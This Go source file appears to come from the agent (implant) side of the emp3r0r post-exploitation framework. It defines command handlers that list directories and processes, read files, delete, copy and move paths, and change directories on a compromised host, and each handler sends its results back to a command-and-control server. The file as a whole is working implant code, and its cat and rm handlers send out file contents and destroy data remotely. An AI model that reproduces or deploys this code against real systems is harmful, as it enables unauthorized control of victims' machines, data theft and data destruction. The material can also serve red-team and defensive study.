package agent

import (
	"fmt"
	"log"
	"os"
	"path/filepath"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/otiai10/copy"
	"github.com/spf13/cobra"
)

func lsCmdRun(cmd *cobra.Command, args []string) {
	// Lists the contents of the specified directory.
	target_dir, _ := cmd.Flags().GetString("dst")
	log.Printf("Listing %s", target_dir)
	out, err := util.LsPath(target_dir)
	if err != nil {
		out = err.Error()
	}

	SendCmdRespToC2(out, cmd, args)
}

func psCmdRun(cmd *cobra.Command, args []string) {
	// Lists all running processes.
	pid, _ := cmd.Flags().GetInt("pid")
	name, _ := cmd.Flags().GetString("name")
	user, _ := cmd.Flags().GetString("user")
	cmdLine, _ := cmd.Flags().GetString("cmdline")
	out, err := ps(pid, user, name, cmdLine)
	if err != nil {
		out = fmt.Sprintf("Failed to ps: %v", err)
	}
	SendCmdRespToC2(out, cmd, args)
}

// catCmdRun reads and sends the contents of the specified file.
func catCmdRun(cmd *cobra.Command, args []string) {
	targetFile, _ := cmd.Flags().GetString("dst")
	if targetFile == "" {
		SendCmdRespToC2("error: no file specified", cmd, args)
		return
	}
	out, err := util.DumpFile(targetFile)
	if err != nil {
		out = fmt.Sprintf("%v", err)
	}
	SendCmdRespToC2(out, cmd, args)
}

// rmCmdRun deletes the specified file or directory.
func rmCmdRun(cmd *cobra.Command, args []string) {
	path, _ := cmd.Flags().GetString("dst")
	if path == "" {
		SendCmdRespToC2(fmt.Sprintf("args error: %v", args), cmd, args)
		return
	}
	if err := os.RemoveAll(path); err != nil {
		SendCmdRespToC2(fmt.Sprintf("Failed to delete %s: %v", path, err), cmd, args)
		return
	}
	SendCmdRespToC2("Deleted "+path, cmd, args)
}

// mkdirCmdRun creates a directory with mode 0700.
func mkdirCmdRun(cmd *cobra.Command, args []string) {
	path, _ := cmd.Flags().GetString("dst")
	if path == "" {
		SendCmdRespToC2(fmt.Sprintf("args error: %v", args), cmd, args)
		return
	}
	if err := os.MkdirAll(path, 0700); err != nil {
		SendCmdRespToC2(fmt.Sprintf("Failed to mkdir %s: %v", path, err), cmd, args)
		return
	}
	SendCmdRespToC2("Mkdir "+path, cmd, args)
}

// cpCmdRun copies a file or directory from source to destination.
func cpCmdRun(cmd *cobra.Command, args []string) {
	src, _ := cmd.Flags().GetString("src")
	dst, _ := cmd.Flags().GetString("dst")
	if src == "" || dst == "" {
		SendCmdRespToC2(fmt.Sprintf("args error: %v", args), cmd, args)
		return
	}
	if err := copy.Copy(src, dst); err != nil {
		SendCmdRespToC2(fmt.Sprintf("Failed to copy %s to %s: %v", src, dst, err), cmd, args)
		return
	}
	SendCmdRespToC2(fmt.Sprintf("%s has been copied to %s", src, dst), cmd, args)
}

// mvCmdRun moves a file or directory from source to destination.
func mvCmdRun(cmd *cobra.Command, args []string) {
	src, _ := cmd.Flags().GetString("src")
	dst, _ := cmd.Flags().GetString("dst")
	if src == "" || dst == "" {
		SendCmdRespToC2(fmt.Sprintf("args error: %v", args), cmd, args)
		return
	}
	if err := os.Rename(src, dst); err != nil {
		SendCmdRespToC2(fmt.Sprintf("Failed to move %s to %s: %v", src, dst, err), cmd, args)
		return
	}
	SendCmdRespToC2(fmt.Sprintf("%s has been moved to %s", src, dst), cmd, args)
}

// cdCmdRun changes the working directory.
func cdCmdRun(cmd *cobra.Command, args []string) {
	path, _ := cmd.Flags().GetString("dst")
	if path == "" {
		SendCmdRespToC2(fmt.Sprintf("args error: %v", args), cmd, args)
		return
	}
	cdPath, err := filepath.Abs(path)
	if err != nil {
		SendCmdRespToC2(fmt.Sprintf("cd error: %v", err), cmd, args)
		return
	}
	if err = os.Chdir(cdPath); err != nil {
		SendCmdRespToC2(fmt.Sprintf("cd error: %v", err), cmd, args)
		return
	}
	SendCmdRespToC2(cdPath, cmd, args)
}

// pwdCmdRun prints the current working directory.
func pwdCmdRun(cmd *cobra.Command, args []string) {
	pwd, err := os.Getwd()
	if err != nil {
		SendCmdRespToC2(fmt.Sprintf("pwd error: %v", err), cmd, args)
		return
	}
	SendCmdRespToC2("current working directory: "+pwd, cmd, args)
}
